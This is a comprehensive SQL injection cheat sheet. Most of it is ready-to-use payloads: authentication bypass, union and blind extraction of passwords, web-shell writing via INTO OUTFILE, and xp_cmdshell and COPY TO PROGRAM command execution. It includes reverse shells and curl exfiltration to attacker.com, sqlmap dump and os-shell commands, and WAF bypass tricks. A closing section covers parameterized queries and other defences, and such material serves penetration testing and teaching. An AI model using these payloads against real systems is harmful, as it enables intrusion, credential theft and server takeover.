# SQL Injection - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Types of SQL Injection](#types-of-sql-injection)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Techniques](#exploitation-techniques)
6. [Database-Specific Attacks](#database-specific-attacks)
7. [Advanced Scenarios](#advanced-scenarios)
8. [Bypass Techniques](#bypass-techniques)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers insert malicious SQL statements into entry fields, manipulating the database to extract, modify, or delete data.

**Impact**:
- Authentication bypass
- Data exfiltration (credentials, PII, financial data)
- Data manipulation/deletion
- Remote code execution
- Complete system compromise
- Denial of Service

**OWASP Ranking**: Consistently in Top 10 (now part of Injection category)

---

## Types of SQL Injection

### 1. In-Band SQLi (Classic)

Data is extracted using the same communication channel. Results visible in application response.

#### a) Error-Based SQLi
```sql
-- Intentionally cause errors to extract information

-- Force database error revealing version
' AND 1=CONVERT(int, @@version)--

-- Extract data via error messages
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--

-- MySQL error extraction
' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--

-- PostgreSQL error extraction
' AND 1=CAST((SELECT current_database()) AS INT)--
```

#### b) Union-Based SQLi
```sql
-- Combine results from injected query with original query

-- Basic union injection
' UNION SELECT NULL, NULL, NULL--

-- Determine number of columns
' ORDER BY 1--    (increment until error)
' ORDER BY 2--
' ORDER BY 3--    (error = 2 columns)

-- Find injectable columns
' UNION SELECT 'a', 'b'--

-- Extract data
' UNION SELECT username, password FROM users--

-- Extract multiple tables
' UNION SELECT table_name, column_name FROM information_schema.columns--
```

### 2. Inferential SQLi (Blind)

No data transferred in application response. Attacker reconstructs data by observing application behavior.

#### a) Boolean-Based Blind SQLi
```sql
-- Application behaves differently for TRUE vs FALSE

-- Test if database is MySQL
' AND (SELECT SUBSTRING(version(),1,1))='5'--   (TRUE: normal response)
' AND (SELECT SUBSTRING(version(),1,1))='4'--   (FALSE: different response)

-- Extract database name character by character
' AND (SELECT SUBSTRING(database(),1,1))='a'--  (FALSE)
' AND (SELECT SUBSTRING(database(),1,1))='b'--  (FALSE)
' AND (SELECT SUBSTRING(database(),1,1))='s'--  (TRUE: database starts with 's')

-- Extract password length
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=5--   (test different lengths)

-- Extract password character by character
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--  (test 'a')
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=98--  (test 'b')
```

#### b) Time-Based Blind SQLi
```sql
-- Infer data from time delays

-- MySQL
' AND IF(1=1, SLEEP(5), 0)--              (if TRUE, delay 5 seconds)
' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server
'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- Oracle
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)--

-- Extract data using binary search
-- Check if first character of password > 'm' (ASCII 109)
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109, SLEEP(5), 0)--
```

### 3. Out-of-Band SQLi (OOB)

Data is exfiltrated using different channel (DNS, HTTP).

```sql
-- MySQL (using LOAD_FILE + UNC path on Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--

-- SQL Server (xp_dirtree)
'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--

-- Oracle (UTL_HTTP)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--

-- PostgreSQL (COPY)
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com?data='||password--
```

### 4. Second-Order SQLi

Injection payload is stored and triggered later.

```sql
-- Registration form: inject into username
Username: admin'--
Password: password123

-- Stored in database as: admin'--

-- Later, when application retrieves username:
SELECT * FROM users WHERE username='admin'--'

-- Breaks query, potentially causing auth bypass
```

---

## Detection Techniques

### Manual Detection

#### 1. Basic Probes
```sql
-- Single quote (causes SQL error if vulnerable)
'

-- SQL comment sequences
--
#
/**/

-- Boolean logic
' OR '1'='1
' OR 1=1--
' OR 'a'='a

-- Time delays
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--

-- Stacked queries
'; SELECT version()--
```

#### 2. Error-Based Detection
```sql
-- Force type conversion error
' AND 1=CONVERT(int, 'test')--

-- Force syntax error
' AND '1'='1' AND '1'='1

-- NULL byte injection
%00' OR 1=1--

-- Force arithmetic error
' AND 1/0--
```

#### 3. Context-Based Testing
```sql
-- Numeric context (id=1)
1 OR 1=1
1' OR '1'='1
1) OR 1=1--

-- String context (name='test')
' OR '1'='1
test' OR 'a'='a
test') OR ('1'='1

-- LIKE context
%' OR '1'='1
%') OR ('1'='1
```

### Automated Detection Indicators

**Response Differences**:
- SQL error messages in response
- Different page content (True vs False conditions)
- Different response times
- Different HTTP status codes
- Different Content-Length

**Error Messages to Look For**:
```
MySQL:
- "You have an error in your SQL syntax"
- "mysql_fetch_array()"
- "MySQL Query fail"

PostgreSQL:
- "ERROR: syntax error at or near"
- "pg_query()"
- "unterminated quoted string"

SQL Server:
- "Unclosed quotation mark after the character string"
- "Incorrect syntax near"
- "ODBC SQL Server Driver"

Oracle:
- "ORA-01756: quoted string not properly terminated"
- "ORA-00933: SQL command not properly ended"
```

---

## Scanning Tools

### 1. SQLMap (Industry Standard)

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=pass"

# Request from Burp Suite
sqlmap -r request.txt

# Enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "https://target.com/page?id=1" -D database_name --tables

# Enumerate columns
sqlmap -u "https://target.com/page?id=1" -D database_name -T users --columns

# Dump table
sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "https://target.com/page?id=1" -D database_name -T users -C username,password --dump

# Get database users
sqlmap -u "https://target.com/page?id=1" --users

# Get current user
sqlmap -u "https://target.com/page?id=1" --current-user

# Get current database
sqlmap -u "https://target.com/page?id=1" --current-db

# Check if user is DBA
sqlmap -u "https://target.com/page?id=1" --is-dba

# Enumerate user privileges
sqlmap -u "https://target.com/page?id=1" --privileges

# Read file from server
sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"

# Write file to server
sqlmap -u "https://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "https://target.com/page?id=1" --sql-shell

# Advanced options
sqlmap -u "https://target.com/page?id=1" \
  --batch \                          # Never ask for user input
  --random-agent \                   # Random User-Agent
  --level=5 \                        # Test level (1-5, higher = more tests)
  --risk=3 \                         # Risk level (1-3, higher = more aggressive)
  --threads=10 \                     # Parallel threads
  --technique=BEUST \                # Techniques: Boolean, Error, Union, Stacked, Time
  --dbms=MySQL \                     # Specify DBMS
  --tamper=space2comment \           # Use tamper script
  --proxy=http://127.0.0.1:8080 \   # Route through proxy
  --flush-session                    # Flush session file

# Cookie-based SQLi
sqlmap -u "https://target.com/page" --cookie="id=1*" --level=2

# Header-based SQLi
sqlmap -u "https://target.com/page" -H "X-Forwarded-For: 1*" --level=3

# JSON injection
sqlmap -u "https://target.com/api" --data='{"id":1}' --level=5

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/page?id=1" --tamper=between,space2comment,charencode

# Common tamper scripts:
# - space2comment: Replace spaces with comments
# - between: Replace BETWEEN with >= AND <=
# - charencode: URL encode characters
# - apostrophemask: Replace apostrophe with UTF-8
# - base64encode: Base64 encode payload
```

### 2. Ghauri (Python SQLi tool, SQLMap alternative)

```bash
# Basic usage
ghauri -u "https://target.com/page?id=1"

# Enumerate databases
ghauri -u "https://target.com/page?id=1" --dbs

# Dump database
ghauri -u "https://target.com/page?id=1" -D dbname --dump

# Batch mode
ghauri -u "https://target.com/page?id=1" --batch

# Proxy
ghauri -u "https://target.com/page?id=1" --proxy http://127.0.0.1:8080
```

### 3. NoSQLMap (NoSQL Injection)

```bash
# MongoDB injection
python nosqlmap.py -u "https://target.com/login" \
  -p "username,password" \
  --attack=1

# JavaScript injection
python nosqlmap.py -u "https://target.com/api" \
  -p "query" \
  --attack=2

# Enumerate databases
python nosqlmap.py -u "https://target.com/api" --get-dbs
```

### 4. jSQL Injection (GUI Tool)

```
Features:
- Cross-platform Java application
- Visual interface
- Supports multiple databases
- Batch scanning
- File reading/writing
- Shell access

Usage:
1. Launch application
2. Enter target URL
3. Select injection method
4. Click "Start"
5. Navigate database tree
```

### 5. Burp Suite

**Scanner (Professional)**:
- Automatic SQL injection detection
- Active and passive scanning

**Manual Testing**:
```
1. Send request to Repeater
2. Add SQLi payloads to parameters
3. Observe response differences
4. Use Intruder for fuzzing
```

**Useful Extensions**:
- SQLiPy: Integrates SQLMap
- CO2: Manual SQL injection testing
- SQLiPy Sqlmap Integration

### 6. Additional Tools

**Havij** (Windows GUI):
- Automated SQL injection
- Easy to use interface
- Database enumeration
- Limited to Windows

**BBQSQL** (Python):
- Blind SQL injection framework
- Custom requests
- Boolean and time-based

```bash
python bbqsql.py -u "https://target.com/page?id=1"
```

**Sqlninja** (SQL Server):
- Specialized for MS SQL Server
- OS command execution
- Reverse shells

```bash
sqlninja -m test -f sqlninja.conf
```

---

## Exploitation Techniques

### Authentication Bypass

```sql
-- Classic bypasses
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1'--
' OR 1=1#
admin'--
admin' #
') OR ('1'='1
admin') OR ('1'='1'--

-- Using UNION
' UNION SELECT 'admin', 'password'--

-- NULL password
admin' AND password IS NULL--

-- Always true conditions
' OR 'a'='a
' OR ''='
```

### Data Extraction

#### 1. Database Enumeration
```sql
-- MySQL
SELECT schema_name FROM information_schema.schemata
SELECT database()
SELECT version()
SELECT user()

-- PostgreSQL
SELECT datname FROM pg_database
SELECT current_database()
SELECT version()
SELECT current_user

-- SQL Server
SELECT name FROM master..sysdatabases
SELECT DB_NAME()
SELECT @@version
SELECT SYSTEM_USER

-- Oracle
SELECT * FROM all_tables
SELECT * FROM user_tables
SELECT banner FROM v$version
SELECT user FROM dual
```

#### 2. Table Enumeration
```sql
-- MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'

-- PostgreSQL
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- SQL Server
SELECT name FROM sysobjects WHERE xtype='U'

-- Oracle
SELECT table_name FROM all_tables
```

#### 3. Column Enumeration
```sql
-- MySQL
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- PostgreSQL
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- SQL Server
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- Oracle
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

#### 4. Data Dumping
```sql
-- MySQL
SELECT CONCAT(username,':',password) FROM users

-- GROUP_CONCAT for multiple rows
SELECT GROUP_CONCAT(username,':',password) FROM users

-- PostgreSQL
SELECT string_agg(username||':'||password, ',') FROM users

-- SQL Server
SELECT username+':'+password FROM users

-- Oracle
SELECT username||':'||password FROM users
```

### File Operations

#### Reading Files
```sql
-- MySQL
SELECT LOAD_FILE('/etc/passwd')
' UNION SELECT LOAD_FILE('/var/www/html/config.php')--

-- PostgreSQL
CREATE TABLE temp(content text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- SQL Server (requires stacked queries)
'; CREATE TABLE temp(content varchar(8000));--
'; BULK INSERT temp FROM 'C:\windows\win.ini';--
'; SELECT * FROM temp;--

-- Oracle
SELECT UTL_FILE.GET_LINE('/etc/passwd')
```

#### Writing Files
```sql
-- MySQL (into outfile)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- MySQL (into dumpfile - single row, no formatting)
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'

-- PostgreSQL
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'
```

### Command Execution

#### MySQL (via UDF)
```sql
-- Create User Defined Function
'; CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';--
'; SELECT sys_exec('whoami');--
```

#### SQL Server (xp_cmdshell)
```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1;--
'; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1;--
'; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'dir C:\';--

-- Reverse shell
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/rev.ps1\")"';--
```

#### PostgreSQL (COPY TO PROGRAM)
```sql
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';--
```

#### Oracle (Java Stored Procedures)
```sql
-- Create Java stored procedure for command execution
-- Requires DBA privileges
```

---

## Database-Specific Attacks

### MySQL

**Version Detection**:
```sql
' AND @@version LIKE '5%'--
' UNION SELECT @@version--
```

**Comment Syntax**:
```sql
-- (space required after)
#
/**/
```

**String Concatenation**:
```sql
CONCAT('a','b')
'a' 'b'  (space concatenation)
```

**Substring**:
```sql
SUBSTRING(str, pos, len)
MID(str, pos, len)
SUBSTR(str, pos, len)
```

**Conditional**:
```sql
IF(condition, true_value, false_value)
```

**Time Delay**:
```sql
SLEEP(5)
BENCHMARK(10000000, MD5('test'))
```

**Unique Features**:
```sql
-- Read files
LOAD_FILE('/etc/passwd')

-- Write files
INTO OUTFILE '/var/www/html/shell.php'

-- Error-based extraction
EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))
UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)
```

### PostgreSQL

**Version Detection**:
```sql
' AND version() LIKE 'PostgreSQL%'--
```

**Comment Syntax**:
```sql
--
/**/
```

**String Concatenation**:
```sql
'a' || 'b'
```

**Substring**:
```sql
SUBSTRING(str, pos, len)
SUBSTR(str, pos, len)
```

**Conditional**:
```sql
CASE WHEN (1=1) THEN 'a' ELSE 'b' END
```

**Time Delay**:
```sql
pg_sleep(5)
```

**Unique Features**:
```sql
-- Current database
current_database()

-- Read files (requires superuser)
COPY temp FROM '/etc/passwd'

-- Command execution
COPY (SELECT '') TO PROGRAM 'whoami'

-- Stack queries
'; DROP TABLE users;--

-- Large object manager (read files)
SELECT lo_import('/etc/passwd', 12345)
SELECT * FROM pg_largeobject WHERE loid=12345
```

### Microsoft SQL Server

**Version Detection**:
```sql
' AND @@version LIKE '%SQL Server%'--
```

**Comment Syntax**:
```sql
--
/**/
```

**String Concatenation**:
```sql
'a' + 'b'
```

**Substring**:
```sql
SUBSTRING(str, pos, len)
```

**Conditional**:
```sql
IF (1=1) SELECT 'a' ELSE SELECT 'b'
```

**Time Delay**:
```sql
WAITFOR DELAY '00:00:05'
```

**Unique Features**:
```sql
-- System information
SELECT @@version
SELECT DB_NAME()
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Execute commands
EXEC xp_cmdshell 'whoami'

-- Read registry
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\...'

-- Network operations
EXEC xp_dirtree '\\attacker.com\share'

-- Linked servers
SELECT * FROM OPENROWSET('SQLOLEDB', 'server=remote;uid=sa;pwd=pass', 'SELECT * FROM users')

-- Stacked queries
'; DROP TABLE users;--
```

### Oracle

**Version Detection**:
```sql
' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--
```

**Comment Syntax**:
```sql
--
```

**String Concatenation**:
```sql
'a' || 'b'
```

**Substring**:
```sql
SUBSTR(str, pos, len)
```

**Conditional**:
```sql
CASE WHEN (1=1) THEN 'a' ELSE 'b' END
```

**Time Delay**:
```sql
DBMS_LOCK.SLEEP(5)
```

**Unique Features**:
```sql
-- Dual table (required for SELECT without FROM)
SELECT 1 FROM dual

-- Rownum (limit results)
SELECT * FROM users WHERE rownum=1

-- Database links
SELECT * FROM users@remote_db

-- UTL_HTTP (HTTP requests / SSRF)
SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual

-- UTL_FILE (file operations)
SELECT UTL_FILE.GET_LINE('/etc/passwd') FROM dual
```

---

## Advanced Scenarios

### WAF Bypass Techniques

#### 1. Comment Injection
```sql
-- Space bypass
SELECT/**/username/**/FROM/**/users

-- Newline bypass
SELECT%0Ausername%0AFROM%0Ausers

-- Tab bypass
SELECT%09username%09FROM%09users
```

#### 2. Case Manipulation
```sql
SeLeCt * FrOm users
sELEct * fROM users
```

#### 3. Encoding
```sql
-- URL encoding
%53%45%4C%45%43%54 = SELECT

-- Double encoding
%2553%2545%254C%2545%2543%2554 = SELECT

-- Unicode
\u0053\u0045\u004C\u0045\u0043\u0054 = SELECT
```

#### 4. Inline Comments
```sql
SE/*comment*/LECT * FR/**/OM users
```

#### 5. Equivalent Functions
```sql
-- Instead of SUBSTRING
MID(), SUBSTR(), LEFT(), RIGHT()

-- Instead of ASCII
ORD()

-- Instead of CONCAT
CONCAT_WS(), GROUP_CONCAT()
```

#### 6. Alternative Keywords
```sql
-- Instead of UNION SELECT
UNION ALL SELECT
UNION DISTINCT SELECT

-- Instead of AND
&&

-- Instead of OR
||

-- Instead of =
LIKE
IN
BETWEEN
```

#### 7. Buffer Overflow / Large Payloads
```sql
' AND 1=1 UNION SELECT 1,2,3,...,1000--  (many columns)
```

#### 8. Scientific Notation
```sql
-- Instead of SLEEP(5)
SLEEP(5e0)
SLEEP(0x5)
```

### Second-Order SQL Injection

**Scenario**: User registration stores malicious SQL in database, later executed in different context.

```sql
-- Step 1: Register user with malicious username
Username: admin'--
Email: attacker@evil.com
Password: pass123

-- Stored in DB as-is

-- Step 2: Login triggers vulnerable query
SELECT * FROM users WHERE username='admin'--' AND password='pass123'
-- Password check bypassed due to comment
```

**Another Example**:
```sql
-- Profile update (stored)
Bio: ' OR 1=1--

-- Later, admin views user profile
SELECT * FROM users WHERE bio LIKE '%' OR 1=1--%'
-- May expose all users
```

### JSON SQL Injection

```sql
-- Vulnerable backend:
SELECT * FROM users WHERE data->>'username' = '$input'

-- Injection payload:
' OR '1'='1

-- Resulting query:
SELECT * FROM users WHERE data->>'username' = '' OR '1'='1'

-- JSON-specific (PostgreSQL)
'; UPDATE users SET data = '{"role":"admin"}' WHERE id=1--
```

### XML SQL Injection

```xml
<!-- Vulnerable parsing -->
<user>
  <username>admin' OR '1'='1</username>
</user>

<!-- If XML data inserted into SQL -->
SELECT * FROM users WHERE username='admin' OR '1'='1'
```

---

## Bypass Techniques

### 1. Quotes Bypass
```sql
-- Using hex encoding
SELECT * FROM users WHERE username=0x61646D696E  (admin in hex)

-- Using char() function
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)

-- Without quotes (numbers)
SELECT * FROM users WHERE id=1 OR 1=1
```

### 2. Space Bypass
```sql
-- Comments
SELECT/**/username/**/FROM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  (tab)
SELECT%0Ausername%0AFROM%0Ausers  (newline)
SELECT%0Dusername%0DFROM%0Dusers  (carriage return)

-- Parentheses
SELECT(username)FROM(users)
```

### 3. Keyword Bypass
```sql
-- AND bypass
' && '1'='1

-- OR bypass
' || '1'='1

-- Concatenated keywords
UN/**/ION SE/**/LECT

-- Case variation
UnIoN SeLeCt

-- Alternative syntax
' /*!50000UNION*/ /*!50000SELECT*/
```

### 4. Comparison Bypass
```sql
-- Instead of =
LIKE
IN (value)
BETWEEN value AND value
REGEXP

-- Instead of <>
NOT IN
NOT LIKE
```

### 5. Filter Bypass Techniques
```sql
-- If "union" filtered
/*!50000UNION*/
%55nion  (URL decoded)
union/**/select
uni<>on sel<>ect

-- If "select" filtered
/*!50000SELECT*/
sel/**/ect
%53elect

-- If spaces filtered
+
/**/
%20
%09 (tab)
%0A (newline)
```

---

## Prevention & Mitigation

### 1. Parameterized Queries (Prepared Statements)

**PHP (PDO)**:
```php
// SECURE
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$userId]);

// Or with named parameters
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
```

**Python (psycopg2)**:
```python
# SECURE
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))

# NOT SECURE
cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')
```

**Node.js (MySQL)**:
```javascript
// SECURE
connection.query('SELECT * FROM users WHERE id = ?', [userId], callback);

// NOT SECURE
connection.query(`SELECT * FROM users WHERE id = ${userId}`, callback);
```

**Java (JDBC)**:
```java
// SECURE
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();

// NOT SECURE
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);
```

### 2. Stored Procedures

```sql
-- Create stored procedure
CREATE PROCEDURE GetUser(IN userId INT)
BEGIN
  SELECT * FROM users WHERE id = userId;
END;

-- Call from application
CALL GetUser(1);
```

**Note**: Stored procedures can still be vulnerable if they build dynamic SQL internally.

### 3. Input Validation

```php
// Whitelist validation
$allowed_columns = ['id', 'username', 'email'];
if (!in_array($sort_column, $allowed_columns)) {
  die('Invalid column');
}

// Type casting
$id = (int)$_GET['id'];

// Regex validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
  die('Invalid username format');
}
```

### 4. Escaping (Last Resort)

```php
// MySQL
$username = mysqli_real_escape_string($conn, $_POST['username']);

// PostgreSQL
$username = pg_escape_string($conn, $_POST['username']);

// Note: Escaping is NOT foolproof. Use parameterized queries instead.
```

### 5. Least Privilege

```sql
-- Create limited database user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'webapp'@'localhost';

-- NO DELETE, DROP, ALTER permissions
-- NO FILE privileges (prevents LOAD_FILE, INTO OUTFILE)
```

### 6. Web Application Firewall (WAF)

- ModSecurity (open-source)
- Cloudflare WAF
- AWS WAF
- Azure WAF

**Custom Rules**:
```
# Block common SQLi patterns
SecRule ARGS "@rx (union|select|insert|update|delete|drop)" "id:1,deny,status:403"
```

### 7. Error Handling

```php
// DON'T expose SQL errors to users
try {
  $result = $pdo->query($sql);
} catch (PDOException $e) {
  // Log error securely
  error_log($e->getMessage());

  // Generic message to user
  die('An error occurred. Please try again later.');
}
```

### 8. Additional Measures

- **Disable dangerous functions** (MySQL: LOAD_FILE, INTO OUTFILE)
- **Use ORM frameworks** (with caution - still possible to write raw SQL)
- **Regular security audits**
- **Code reviews**
- **Automated scanning in CI/CD**
- **Keep database software updated**
- **Network segmentation** (database on private network)
- **Monitoring and alerting** (detect SQL injection attempts)

### Security Checklist

- [ ] All database queries use parameterized statements
- [ ] Input validation on all user inputs
- [ ] Database user has minimal necessary privileges
- [ ] SQL errors not exposed to users
- [ ] WAF configured with SQL injection rules
- [ ] Regular security scanning
- [ ] Stored procedures reviewed for dynamic SQL
- [ ] ORM usage reviewed for raw SQL
- [ ] File operations disabled in database
- [ ] Database patched and updated

---

**Additional Resources**:
- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger SQL Injection Labs
- SQLMap Documentation
- PentestMonkey SQL Injection Cheat Sheet
